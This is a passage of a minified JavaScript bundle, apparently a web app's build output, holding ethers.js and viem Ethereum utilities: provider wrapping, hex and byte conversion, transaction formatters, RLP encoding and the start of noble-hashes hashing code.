zx{constructor(e,t){e==null&&eD.throwArgumentError("missing provider","provider",e);let i=null,n=null,s=null;typeof e=="function"?(i="unknown:",n=e):(i=e.host||e.path||"",!i&&e.isMetaMask&&(i="metamask"),s=e,e.request?(i===""&&(i="eip-1193:"),n=Nde(e)):e.sendAsync?n=tD(e,e.sendAsync.bind(e)):e.send?n=tD(e,e.send.bind(e)):eD.throwArgumentError("unsupported provider","provider",e),i||(i="unknown:")),super(i,t),Pe(this,"jsonRpcFetchFunc",n),Pe(this,"provider",s)}send(e,t){return this.jsonRpcFetchFunc(e,t)}}const Pde="solidity/5.8.0",$de=new RegExp("^bytes([0-9]+)$"),Rde=new RegExp("^(u?int)([0-9]*)$"),Ode=new RegExp("^(.*)\\[([0-9]*)\\]$"),Bde="0000000000000000000000000000000000000000000000000000000000000000",Tm=new be(Pde);function wY(r,e,t){switch(r){case"address":return t?g5(e,32):ze(e);case"string":return Fn(e);case"bytes":return ze(e);case"bool":return e=e?"0x01":"0x00",t?g5(e,32):ze(e)}let i=r.match(Rde);if(i){let n=parseInt(i[2]||"256");return(i[2]&&String(n)!==i[2]||n%8!==0||n===0||n>256)&&Tm.throwArgumentError("invalid number type","type",r),t&&(n=256),e=Ge.from(e).toTwos(n),g5(e,n/8)}if(i=r.match($de),i){const n=parseInt(i[1]);return(String(n)!==i[1]||n===0||n>32)&&Tm.throwArgumentError("invalid bytes type","type",r),ze(e).byteLength!==n&&Tm.throwArgumentError(`invalid value for ${r}`,"value",e),t?ze((e+Bde).substring(0,66)):e}if(i=r.match(Ode),i&&Array.isArray(e)){const n=i[1];parseInt(i[2]||String(e.length))!=e.length&&Tm.throwArgumentError(`invalid array length for ${r}`,"value",e);const o=[];return e.forEach(function(a){o.push(wY(n,a,!0))}),cn(o)}return Tm.throwArgumentError("invalid type","type",r)}function k$(r,e){r.length!=e.length&&Tm.throwArgumentError("wrong number of values; expected ${ types.length }","values",e);const t=[];return r.forEach(function(i,n){t.push(wY(i,e[n]))}),Qe(cn(t))}function Mde(r,e){return Ui(k$(r,e))}function Dde(r,e){return a0(k$(r,e))}const Lde=Object.freeze(Object.defineProperty({__proto__:null,keccak256:Mde,pack:k$,sha256:Dde},Symbol.toStringTag,{value:"Module"})),Ude="units/5.8.0",bY=new be(Ude),vY=["wei","kwei","mwei","gwei","szabo","finney","ether"];function jde(r){const e=String(r).split(".");(e.length>2||!e[0].match(/^-?[0-9]*$/)||e[1]&&!e[1].match(/^[0-9]*$/)||r==="."||r==="-.")&&bY.throwArgumentError("invalid value","value",r);let t=e[0],i="";for(t.substring(0,1)==="-"&&(i="-",t=t.substring(1));t.substring(0,1)==="0";)t=t.substring(1);t===""&&(t="0");let n="";for(e.length===2&&(n="."+(e[1]||"0"));n.length>2&&n[n.length-1]==="0";)n=n.substring(0,n.length-1);const s=[];for(;t.length;)if(t.length<=3){s.unshift(t);break}else{const o=t.length-3;s.unshift(t.substring(o)),t=t.substring(0,o)}return i+s.join(",")+n}function N$(r,e){if(typeof e=="string"){const t=vY.indexOf(e);t!==-1&&(e=3*t)}return q8(r,e??18)}function P$(r,e){if(typeof r!="string"&&bY.throwArgumentError("value must be a string","value",r),typeof e=="string"){const t=vY.indexOf(e);t!==-1&&(e=3*t)}return Xu(r,e??18)}function Fde(r){return N$(r,18)}function qde(r){return P$(r,18)}const zde=Object.freeze(Object.defineProperty({__proto__:null,commify:jde,formatEther:Fde,formatUnits:N$,parseEther:qde,parseUnits:P$},Symbol.toStringTag,{value:"Module"})),Wde="modulepreload",Hde=function(r){return"/"+r},rD={},Ke=function(e,t,i){let n=Promise.resolve();if(t&&t.length>0){let c=function(l){return Promise.all(l.map(u=>Promise.resolve(u).then(d=>({status:"fulfilled",value:d}),d=>({status:"rejected",reason:d}))))};document.getElementsByTagName("link");const o=document.querySelector("meta[property=csp-nonce]"),a=o?.nonce||o?.getAttribute("nonce");n=c(t.map(l=>{if(l=Hde(l),l in rD)return;rD[l]=!0;const u=l.endsWith(".css"),d=u?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${l}"]${d}`))return;const h=document.createElement("link");if(h.rel=u?"stylesheet":Wde,u||(h.as="script"),h.crossOrigin="",h.href=l,a&&h.setAttribute("nonce",a),document.head.appendChild(h),u)return new Promise((f,p)=>{h.addEventListener("load",f),h.addEventListener("error",()=>p(new Error(`Unable to preload CSS for ${l}`)))})}))}function s(o){const a=new Event("vite:preloadError",{cancelable:!0});if(a.payload=o,window.dispatchEvent(a),!a.defaultPrevented)throw o}return n.then(o=>{for(const a of o||[])a.status==="rejected"&&s(a.reason);return e().catch(s)})};function Zt(r){return{formatters:void 0,fees:void 0,serializers:void 0,...r}}const yY="2.33.0";let c_={getDocsUrl:({docsBaseUrl:r,docsPath:e="",docsSlug:t})=>e?`${r??"https://viem.sh"}${e}${t?`#${t}`:""}`:void 0,version:`viem@${yY}`},Xt=class ek extends Error{constructor(e,t={}){const i=t.cause instanceof ek?t.cause.details:t.cause?.message?t.cause.message:t.details,n=t.cause instanceof ek&&t.cause.docsPath||t.docsPath,s=c_.getDocsUrl?.({...t,docsPath:n}),o=[e||"An error occurred.","",...t.metaMessages?[...t.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...i?[`Details: ${i}`]:[],...c_.version?[`Version: ${c_.version}`]:[]].join(`
`);super(o,t.cause?{cause:t.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=i,this.docsPath=n,this.metaMessages=t.metaMessages,this.name=t.name??this.name,this.shortMessage=e,this.version=yY}walk(e){return xY(this,e)}};function xY(r,e){return e?.(r)?r:r&&typeof r=="object"&&"cause"in r&&r.cause!==void 0?xY(r.cause,e):e?null:r}let Vde=class extends Xt{constructor({max:e,min:t,signed:i,size:n,value:s}){super(`Number "${s}" is not in safe ${n?`${n*8}-bit ${i?"signed":"unsigned"} `:""}integer range ${e?`(${t} to ${e})`:`(above ${t})`}`,{name:"IntegerOutOfRangeError"})}},Kde=class extends Xt{constructor({givenSize:e,maxSize:t}){super(`Size cannot exceed ${t} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}};function Xy(r,{strict:e=!0}={}){return!r||typeof r!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(r):r.startsWith("0x")}function ww(r){return Xy(r,{strict:!1})?Math.ceil((r.length-2)/2):r.length}function bw(r,{dir:e="left"}={}){let t=typeof r=="string"?r.replace("0x",""):r,i=0;for(let n=0;n<t.length-1&&t[e==="left"?n:t.length-n-1].toString()==="0";n++)i++;return t=e==="left"?t.slice(i):t.slice(0,t.length-i),typeof r=="string"?(t.length===1&&e==="right"&&(t=`${t}0`),`0x${t.length%2===1?`0${t}`:t}`):t}class Gde extends Xt{constructor({offset:e,position:t,size:i}){super(`Slice ${t==="start"?"starting":"ending"} at offset "${e}" is out-of-bounds (size: ${i}).`,{name:"SliceOffsetOutOfBoundsError"})}}let CY=class extends Xt{constructor({size:e,targetSize:t,type:i}){super(`${i.charAt(0).toUpperCase()}${i.slice(1).toLowerCase()} size (${e}) exceeds padding size (${t}).`,{name:"SizeExceedsPaddingSizeError"})}};function Yg(r,{dir:e,size:t=32}={}){return typeof r=="string"?Zde(r,{dir:e,size:t}):Yde(r,{dir:e,size:t})}function Zde(r,{dir:e,size:t=32}={}){if(t===null)return r;const i=r.replace("0x","");if(i.length>t*2)throw new CY({size:Math.ceil(i.length/2),targetSize:t,type:"hex"});return`0x${i[e==="right"?"padEnd":"padStart"](t*2,"0")}`}function Yde(r,{dir:e,size:t=32}={}){if(t===null)return r;if(r.length>t)throw new CY({size:r.length,targetSize:t,type:"bytes"});const i=new Uint8Array(t);for(let n=0;n<t;n++){const s=e==="right";i[s?n:t-n-1]=r[s?n:r.length-n-1]}return i}const Jde=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function $i(r,e={}){return typeof r=="number"||typeof r=="bigint"?dr(r,e):typeof r=="string"?EY(r,e):typeof r=="boolean"?Qde(r,e):A0(r,e)}function Qde(r,e={}){const t=`0x${Number(r)}`;return typeof e.size=="number"?(y3(t,{size:e.size}),Yg(t,{size:e.size})):t}function A0(r,e={}){let t="";for(let n=0;n<r.length;n++)t+=Jde[r[n]];const i=`0x${t}`;return typeof e.size=="number"?(y3(i,{size:e.size}),Yg(i,{dir:"right",size:e.size})):i}function dr(r,e={}){const{signed:t,size:i}=e,n=BigInt(r);let s;i?t?s=(1n<<BigInt(i)*8n-1n)-1n:s=2n**(BigInt(i)*8n)-1n:typeof r=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&t?-s-1n:0;if(s&&n>s||n<o){const c=typeof r=="bigint"?"n":"";throw new Vde({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:t,size:i,value:`${r}${c}`})}const a=`0x${(t&&n<0?(1n<<BigInt(i*8))+BigInt(n):n).toString(16)}`;return i?Yg(a,{size:i}):a}const Xde=new TextEncoder;function EY(r,e={}){const t=Xde.encode(r);return A0(t,e)}const ehe=new TextEncoder;function C5(r,e={}){return typeof r=="number"||typeof r=="bigint"?rhe(r,e):typeof r=="boolean"?the(r,e):Xy(r)?vd(r,e):_Y(r,e)}function the(r,e={}){const t=new Uint8Array(1);return t[0]=Number(r),typeof e.size=="number"?(y3(t,{size:e.size}),Yg(t,{size:e.size})):t}const uh={zero:48,nine:57,A:65,F:70,a:97,f:102};function iD(r){if(r>=uh.zero&&r<=uh.nine)return r-uh.zero;if(r>=uh.A&&r<=uh.F)return r-(uh.A-10);if(r>=uh.a&&r<=uh.f)return r-(uh.a-10)}function vd(r,e={}){let t=r;e.size&&(y3(t,{size:e.size}),t=Yg(t,{dir:"right",size:e.size}));let i=t.slice(2);i.length%2&&(i=`0${i}`);const n=i.length/2,s=new Uint8Array(n);for(let o=0,a=0;o<n;o++){const c=iD(i.charCodeAt(a++)),l=iD(i.charCodeAt(a++));if(c===void 0||l===void 0)throw new Xt(`Invalid byte sequence ("${i[a-2]}${i[a-1]}" in "${i}").`);s[o]=c*16+l}return s}function rhe(r,e){const t=dr(r,e);return vd(t)}function _Y(r,e={}){const t=ehe.encode(r);return typeof e.size=="number"?(y3(t,{size:e.size}),Yg(t,{dir:"right",size:e.size})):t}function y3(r,{size:e}){if(ww(r)>e)throw new Kde({givenSize:ww(r),maxSize:e})}function Vn(r,e={}){const{signed:t}=e;e.size&&y3(r,{size:e.size});const i=BigInt(r);if(!t)return i;const n=(r.length-2)/2,s=(1n<<BigInt(n)*8n-1n)-1n;return i<=s?i:i-BigInt(`0x${"f".padStart(n*2,"f")}`)-1n}function lv(r,e={}){return Number(Vn(r,e))}function Wx(r,e){return({exclude:t,format:i})=>({exclude:t,format:n=>{const s=e(n);if(t)for(const o of t)delete s[o];return{...s,...i(n)}},type:r})}const SY={"0x0":"legacy","0x1":"eip2930","0x2":"eip1559","0x3":"eip4844","0x4":"eip7702"};function Hx(r){const e={...r,blockHash:r.blockHash?r.blockHash:null,blockNumber:r.blockNumber?BigInt(r.blockNumber):null,chainId:r.chainId?lv(r.chainId):void 0,gas:r.gas?BigInt(r.gas):void 0,gasPrice:r.gasPrice?BigInt(r.gasPrice):void 0,maxFeePerBlobGas:r.maxFeePerBlobGas?BigInt(r.maxFeePerBlobGas):void 0,maxFeePerGas:r.maxFeePerGas?BigInt(r.maxFeePerGas):void 0,maxPriorityFeePerGas:r.maxPriorityFeePerGas?BigInt(r.maxPriorityFeePerGas):void 0,nonce:r.nonce?lv(r.nonce):void 0,to:r.to?r.to:null,transactionIndex:r.transactionIndex?Number(r.transactionIndex):null,type:r.type?SY[r.type]:void 0,typeHex:r.type?r.type:void 0,value:r.value?BigInt(r.value):void 0,v:r.v?BigInt(r.v):void 0};return r.authorizationList&&(e.authorizationList=ihe(r.authorizationList)),e.yParity=(()=>{if(r.yParity)return Number(r.yParity);if(typeof e.v=="bigint"){if(e.v===0n||e.v===27n)return 0;if(e.v===1n||e.v===28n)return 1;if(e.v>=35n)return e.v%2n===0n?1:0}})(),e.type==="legacy"&&(delete e.accessList,delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas,delete e.yParity),e.type==="eip2930"&&(delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas),e.type==="eip1559"&&delete e.maxFeePerBlobGas,e}const $$=Wx("transaction",Hx);function ihe(r){return r.map(e=>({address:e.address,chainId:Number(e.chainId),nonce:Number(e.nonce),r:e.r,s:e.s,yParity:Number(e.yParity)}))}function nhe(r){const e=(r.transactions??[]).map(t=>typeof t=="string"?t:Hx(t));return{...r,baseFeePerGas:r.baseFeePerGas?BigInt(r.baseFeePerGas):null,blobGasUsed:r.blobGasUsed?BigInt(r.blobGasUsed):void 0,difficulty:r.difficulty?BigInt(r.difficulty):void 0,excessBlobGas:r.excessBlobGas?BigInt(r.excessBlobGas):void 0,gasLimit:r.gasLimit?BigInt(r.gasLimit):void 0,gasUsed:r.gasUsed?BigInt(r.gasUsed):void 0,hash:r.hash?r.hash:null,logsBloom:r.logsBloom?r.logsBloom:null,nonce:r.nonce?r.nonce:null,number:r.number?BigInt(r.number):null,size:r.size?BigInt(r.size):void 0,timestamp:r.timestamp?BigInt(r.timestamp):void 0,transactions:e,totalDifficulty:r.totalDifficulty?BigInt(r.totalDifficulty):null}}const R$=Wx("block",nhe);function AY(r,{args:e,eventName:t}={}){return{...r,blockHash:r.blockHash?r.blockHash:null,blockNumber:r.blockNumber?BigInt(r.blockNumber):null,logIndex:r.logIndex?Number(r.logIndex):null,transactionHash:r.transactionHash?r.transactionHash:null,transactionIndex:r.transactionIndex?Number(r.transactionIndex):null,...t?{args:e,eventName:t}:{}}}const she={"0x0":"reverted","0x1":"success"};function ohe(r){const e={...r,blockNumber:r.blockNumber?BigInt(r.blockNumber):null,contractAddress:r.contractAddress?r.contractAddress:null,cumulativeGasUsed:r.cumulativeGasUsed?BigInt(r.cumulativeGasUsed):null,effectiveGasPrice:r.effectiveGasPrice?BigInt(r.effectiveGasPrice):null,gasUsed:r.gasUsed?BigInt(r.gasUsed):null,logs:r.logs?r.logs.map(t=>AY(t)):null,to:r.to?r.to:null,transactionIndex:r.transactionIndex?lv(r.transactionIndex):null,status:r.status?she[r.status]:null,type:r.type?SY[r.type]||r.type:null};return r.blobGasPrice&&(e.blobGasPrice=BigInt(r.blobGasPrice)),r.blobGasUsed&&(e.blobGasUsed=BigInt(r.blobGasUsed)),e}const IY=Wx("transactionReceipt",ohe),ahe={legacy:"0x0",eip2930:"0x1",eip1559:"0x2",eip4844:"0x3",eip7702:"0x4"};function TY(r){const e={};return typeof r.authorizationList<"u"&&(e.authorizationList=che(r.authorizationList)),typeof r.accessList<"u"&&(e.accessList=r.accessList),typeof r.blobVersionedHashes<"u"&&(e.blobVersionedHashes=r.blobVersionedHashes),typeof r.blobs<"u"&&(typeof r.blobs[0]!="string"?e.blobs=r.blobs.map(t=>A0(t)):e.blobs=r.blobs),typeof r.data<"u"&&(e.data=r.data),typeof r.from<"u"&&(e.from=r.from),typeof r.gas<"u"&&(e.gas=dr(r.gas)),typeof r.gasPrice<"u"&&(e.gasPrice=dr(r.gasPrice)),typeof r.maxFeePerBlobGas<"u"&&(e.maxFeePerBlobGas=dr(r.maxFeePerBlobGas)),typeof r.maxFeePerGas<"u"&&(e.maxFeePerGas=dr(r.maxFeePerGas)),typeof r.maxPriorityFeePerGas<"u"&&(e.maxPriorityFeePerGas=dr(r.maxPriorityFeePerGas)),typeof r.nonce<"u"&&(e.nonce=dr(r.nonce)),typeof r.to<"u"&&(e.to=r.to),typeof r.type<"u"&&(e.type=ahe[r.type]),typeof r.value<"u"&&(e.value=dr(r.value)),e}const kY=Wx("transactionRequest",TY);function che(r){return r.map(e=>({address:e.address,r:e.r?dr(BigInt(e.r)):e.r,s:e.s?dr(BigInt(e.s)):e.s,chainId:dr(e.chainId),nonce:dr(e.nonce),...typeof e.yParity<"u"?{yParity:dr(e.yParity)}:{},...typeof e.v<"u"&&typeof e.yParity>"u"?{v:dr(e.v)}:{}}))}const lhe=2n**16n-1n,e4=2n**256n-1n,O$=50000n,nD=lhe*32n,NY={block:R$({format(r){const e=r.transactions?.map(t=>{if(typeof t=="string")return t;const i=NY.transaction?.format(t);return i.typeHex==="0x71"?i.type="eip712":i.typeHex==="0xff"&&(i.type="priority"),i});return{l1BatchNumber:r.l1BatchNumber?Vn(r.l1BatchNumber):null,l1BatchTimestamp:r.l1BatchTimestamp?Vn(r.l1BatchTimestamp):null,transactions:e}}}),transaction:$$({format(r){const e={};return r.type==="0x71"?e.type="eip712":r.type==="0xff"&&(e.type="priority"),{...e,l1BatchNumber:r.l1BatchNumber?Vn(r.l1BatchNumber):null,l1BatchTxIndex:r.l1BatchTxIndex?Vn(r.l1BatchTxIndex):null}}}),transactionReceipt:IY({format(r){return{l1BatchNumber:r.l1BatchNumber?Vn(r.l1BatchNumber):null,l1BatchTxIndex:r.l1BatchTxIndex?Vn(r.l1BatchTxIndex):null,logs:r.logs.map(e=>({...AY(e),l1BatchNumber:e.l1BatchNumber?Vn(e.l1BatchNumber):null,transactionLogIndex:lv(e.transactionLogIndex),logType:e.logType})),l2ToL1Logs:r.l2ToL1Logs.map(e=>({blockNumber:Vn(e.blockHash),blockHash:e.blockHash,l1BatchNumber:e.l1BatchNumber?Vn(e.l1BatchNumber):null,transactionIndex:Vn(e.transactionIndex),shardId:Vn(e.shardId),isService:e.isService,sender:e.sender,key:e.key,value:e.value,transactionHash:e.transactionHash,logIndex:Vn(e.logIndex)}))}}}),transactionRequest:kY({exclude:["customSignature","factoryDeps","gasPerPubdata","paymaster","paymasterInput"],format(r){return r.gasPerPubdata||r.paymaster&&r.paymasterInput||r.factoryDeps||r.customSignature?{eip712Meta:{...r.gasPerPubdata?{gasPerPubdata:$i(r.gasPerPubdata)}:{gasPerPubdata:$i(O$)},...r.paymaster&&r.paymasterInput?{paymasterParams:{paymaster:r.paymaster,paymasterInput:Array.from(vd(r.paymasterInput))}}:{},...r.factoryDeps?{factoryDeps:r.factoryDeps.map(e=>Array.from(vd(e)))}:{},...r.customSignature?{customSignature:Array.from(vd(r.customSignature))}:{}},type:"0x71"}:{}}})};function Jg(r){return`0x${r.reduce((e,t)=>e+t.replace("0x",""),"")}`}class sD extends Xt{constructor({offset:e}){super(`Offset \`${e}\` cannot be negative.`,{name:"NegativeOffsetError"})}}class uhe extends Xt{constructor({length:e,position:t}){super(`Position \`${t}\` is out of bounds (\`0 < position < ${e}\`).`,{name:"PositionOutOfBoundsError"})}}class dhe extends Xt{constructor({count:e,limit:t}){super(`Recursive read limit of \`${t}\` exceeded (recursive read count: \`${e}\`).`,{name:"RecursiveReadLimitExceededError"})}}const hhe={bytes:new Uint8Array,dataView:new DataView(new ArrayBuffer(0)),position:0,positionReadCount:new Map,recursiveReadCount:0,recursiveReadLimit:Number.POSITIVE_INFINITY,assertReadLimit(){if(this.recursiveReadCount>=this.recursiveReadLimit)throw new dhe({count:this.recursiveReadCount+1,limit:this.recursiveReadLimit})},assertPosition(r){if(r<0||r>this.bytes.length-1)throw new uhe({length:this.bytes.length,position:r})},decrementPosition(r){if(r<0)throw new sD({offset:r});const e=this.position-r;this.assertPosition(e),this.position=e},getReadCount(r){return this.positionReadCount.get(r||this.position)||0},incrementPosition(r){if(r<0)throw new sD({offset:r});const e=this.position+r;this.assertPosition(e),this.position=e},inspectByte(r){const e=r??this.position;return this.assertPosition(e),this.bytes[e]},inspectBytes(r,e){const t=e??this.position;return this.assertPosition(t+r-1),this.bytes.subarray(t,t+r)},inspectUint8(r){const e=r??this.position;return this.assertPosition(e),this.bytes[e]},inspectUint16(r){const e=r??this.position;return this.assertPosition(e+1),this.dataView.getUint16(e)},inspectUint24(r){const e=r??this.position;return this.assertPosition(e+2),(this.dataView.getUint16(e)<<8)+this.dataView.getUint8(e+2)},inspectUint32(r){const e=r??this.position;return this.assertPosition(e+3),this.dataView.getUint32(e)},pushByte(r){this.assertPosition(this.position),this.bytes[this.position]=r,this.position++},pushBytes(r){this.assertPosition(this.position+r.length-1),this.bytes.set(r,this.position),this.position+=r.length},pushUint8(r){this.assertPosition(this.position),this.bytes[this.position]=r,this.position++},pushUint16(r){this.assertPosition(this.position+1),this.dataView.setUint16(this.position,r),this.position+=2},pushUint24(r){this.assertPosition(this.position+2),this.dataView.setUint16(this.position,r>>8),this.dataView.setUint8(this.position+2,r&255),this.position+=3},pushUint32(r){this.assertPosition(this.position+3),this.dataView.setUint32(this.position,r),this.position+=4},readByte(){this.assertReadLimit(),this._touch();const r=this.inspectByte();return this.position++,r},readBytes(r,e){this.assertReadLimit(),this._touch();const t=this.inspectBytes(r);return this.position+=e??r,t},readUint8(){this.assertReadLimit(),this._touch();const r=this.inspectUint8();return this.position+=1,r},readUint16(){this.assertReadLimit(),this._touch();const r=this.inspectUint16();return this.position+=2,r},readUint24(){this.assertReadLimit(),this._touch();const r=this.inspectUint24();return this.position+=3,r},readUint32(){this.assertReadLimit(),this._touch();const r=this.inspectUint32();return this.position+=4,r},get remaining(){return this.bytes.length-this.position},setPosition(r){const e=this.position;return this.assertPosition(r),this.position=r,()=>this.position=e},_touch(){if(this.recursiveReadLimit===Number.POSITIVE_INFINITY)return;const r=this.getReadCount();this.positionReadCount.set(this.position,r+1),r>0&&this.recursiveReadCount++}};function PY(r,{recursiveReadLimit:e=8192}={}){const t=Object.create(hhe);return t.bytes=r,t.dataView=new DataView(r.buffer,r.byteOffset,r.byteLength),t.positionReadCount=new Map,t.recursiveReadLimit=e,t}function c0(r,e="hex"){const t=$Y(r),i=PY(new Uint8Array(t.length));return t.encode(i),e==="hex"?A0(i.bytes):i.bytes}function $Y(r){return Array.isArray(r)?fhe(r.map(e=>$Y(e))):phe(r)}function fhe(r){const e=r.reduce((n,s)=>n+s.length,0),t=RY(e);return{length:e<=55?1+e:1+t+e,encode(n){e<=55?n.pushByte(192+e):(n.pushByte(247+t),t===1?n.pushUint8(e):t===2?n.pushUint16(e):t===3?n.pushUint24(e):n.pushUint32(e));for(const{encode:s}of r)s(n)}}}function phe(r){const e=typeof r=="string"?vd(r):r,t=RY(e.length);return{length:e.length===1&&e[0]<128?1:e.length<=55?1+e.length:1+t+e.length,encode(n){e.length===1&&e[0]<128?n.pushBytes(e):e.length<=55?(n.pushByte(128+e.length),n.pushBytes(e)):(n.pushByte(183+t),t===1?n.pushUint8(e.length):t===2?n.pushUint16(e.length):t===3?n.pushUint24(e.length):n.pushUint32(e.length),n.pushBytes(e))}}}function RY(r){if(r<2**8)return 1;if(r<2**16)return 2;if(r<2**24)return 3;if(r<2**32)return 4;throw new Xt("Length is too large.")}const ghe={gwei:9,wei:18},mhe={ether:-9,wei:9};function Vx(r,e){let t=r.toString();const i=t.startsWith("-");i&&(t=t.slice(1)),t=t.padStart(e,"0");let[n,s]=[t.slice(0,t.length-e),t.slice(t.length-e)];return s=s.replace(/(0+)$/,""),`${i?"-":""}${n||"0"}${s?`.${s}`:""}`}function whe(r,e="wei"){return Vx(r,ghe[e])}function R1(r,e="wei"){return Vx(r,mhe[e])}function OY(r){const e=Object.entries(r).map(([i,n])=>n===void 0||n===!1?null:[i,n]).filter(Boolean),t=e.reduce((i,[n])=>Math.max(i,n.length),0);return e.map(([i,n])=>`  ${`${i}:`.padEnd(t+1)}  ${n}`).join(`
`)}class bhe extends Xt{constructor(){super(["Cannot specify both a `gasPrice` and a `maxFeePerGas`/`maxPriorityFeePerGas`.","Use `maxFeePerGas`/`maxPriorityFeePerGas` for EIP-1559 compatible networks, and `gasPrice` for others."].join(`
`),{name:"FeeConflictError"})}}class vhe extends Xt{constructor({v:e}){super(`Invalid \`v\` value "${e}". Expected 27 or 28.`,{name:"InvalidLegacyVError"})}}class yhe extends Xt{constructor({transaction:e}){super("Cannot infer a transaction type from provided transaction.",{metaMessages:["Provided Transaction:","{",OY(e),"}","","To infer the type, either provide:","- a `type` to the Transaction, or","- an EIP-1559 Transaction with `maxFeePerGas`, or","- an EIP-2930 Transaction with `gasPrice` & `accessList`, or","- an EIP-4844 Transaction with `blobs`, `blobVersionedHashes`, `sidecars`, or","- an EIP-7702 Transaction with `authorizationList`, or","- a Legacy Transaction with `gasPrice`"],name:"InvalidSerializableTransactionError"})}}class xhe extends Xt{constructor({storageKey:e}){super(`Size for storage key "${e}" is invalid. Expected 32 bytes. Got ${Math.floor((e.length-2)/2)} bytes.`,{name:"InvalidStorageKeySizeError"})}}function Che(r){if(!r||r.length===0)return[];const e=[];for(const t of r){const{chainId:i,nonce:n,...s}=t,o=t.address;e.push([i?$i(i):"0x",o,n?$i(n):"0x",...C3({},s)])}return e}function BY(r){const{kzg:e}=r,t=r.to??(typeof r.blobs[0]=="string"?"hex":"bytes"),i=typeof r.blobs[0]=="string"?r.blobs.map(s=>vd(s)):r.blobs,n=[];for(const s of i)n.push(Uint8Array.from(e.blobToKzgCommitment(s)));return t==="bytes"?n:n.map(s=>A0(s))}function MY(r){const{kzg:e}=r,t=r.to??(typeof r.blobs[0]=="string"?"hex":"bytes"),i=typeof r.blobs[0]=="string"?r.blobs.map(o=>vd(o)):r.blobs,n=typeof r.commitments[0]=="string"?r.commitments.map(o=>vd(o)):r.commitments,s=[];for(let o=0;o<i.length;o++){const a=i[o],c=n[o];s.push(Uint8Array.from(e.computeBlobKzgProof(a,c)))}return t==="bytes"?s:s.map(o=>A0(o))}const D2=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function Ehe(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function uv(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function rp(r,...e){if(!Ehe(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function _he(r){if(typeof r!="function"||typeof r.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");uv(r.outputLen),uv(r.blockLen)}function vw(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function DY(r,e){rp(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}function She(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function yw(...r){for(let e=0;e<r.length;e++)r[e].fill(0)}function l_(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}function Du(r,e){return r<<32-e|r>>>e}const Ahe=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function Ihe(r){return r<<24&4278190080|r<<8&16711680|r>>>8&65280|r>>>24&255}function The(r){for(let e=0;e<r.length;e++)r[e]=Ihe(r[e]);return r}const oD=Ahe?r=>r:The,khe=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",Nhe=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function Phe(r){if(rp(r),khe)return r.toHex();let e="";for(let t=0;t<r.length;t++)e+=Nhe[r[t]];return e}function $he(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}function Kx(r){return typeof r=="string"&&(r=$he(r)),rp(r),r}function Rhe(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];rp(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}let B$=class{};function LY(r){const e=i=>r().update(Kx(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function Ohe(r=32){if(D2&&typeof D2.getRandomValues=="function")return D2.getRandomValues(new Uint8Array(r));if(D2&&typeof D2.randomBytes=="function")return Uint8Array.from(D2.randomBytes(r));throw new Error("crypto.getRandomValues must be defined")}function Bhe(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}function Mhe(r,e,t){return r&e^~r&t}function Dhe(r,e,t){return r&e^r&t^e&t}let Lhe=class extends B${constructor(e,t,i,n){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.buffer=new Uint8Array(e),this.view=l_(this.buffer)}update(e){vw(this),e=Kx(e),rp(e);const{view:t,buffer:i,blockLen:n}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=l_(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){vw(this),DY(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,yw(this.buffer.subarray(o)),this.padOffset>n-o&&(this.process(i,0),o=0);for(let 